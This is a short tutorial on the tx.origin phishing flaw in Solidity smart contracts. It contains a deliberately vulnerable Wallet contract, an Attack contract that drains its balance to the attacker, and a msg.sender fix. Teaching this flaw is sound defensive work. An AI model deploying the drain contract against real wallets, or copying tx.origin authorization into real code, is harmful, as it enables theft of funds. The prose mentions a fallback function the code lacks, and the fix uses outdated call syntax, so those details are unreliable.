## Phishing with tx.origin attack
tx.origin is a global variable in Solidity which returns the address of the account that sent the transaction. Contracts that use the tx.origin to authorize users are vulnerable to phishing attacks.

Let’s say a call could be made to the vulnerable contract that passes the authorization check since tx.origin returns the original sender of the transaction which in this case is the authorized account.

# Let's look at the example.

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner);

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}


I created two contracts: Wallet that stores and withdraws funds, and Attack which is a contract made by an attacker who wants to attack the first contract.

Note that the contract authorizes the transfer function using tx.origin.

Now, if the owner of the Wallet contract sends a transaction with enough gas to the Attack address, it will invoke the fallback function, which in turn calls the transfer function of the Wallet contract with the parameter attacker.

As a result, all funds from the Wallet contract will be withdrawn to the attacker's address. This is because the address that first initialized the call was the victim (i.e., the owner of the Wallet contract).

Therefore, tx.origin will be equal to the owner and the require on will pass.

# How to prevent Tx Origin attacks

The best way to prevent Tx Origin attacks is not to use the tx.origin for authentication purposes. Instead, it is advisable to use msg.sender

function transfer(address payable _to, uint256 _amount) public {
  require(msg.sender == owner);

  (bool sent, ) = _to.call.value(_amount)("");
  require(sent, "Failed to send Ether");
}
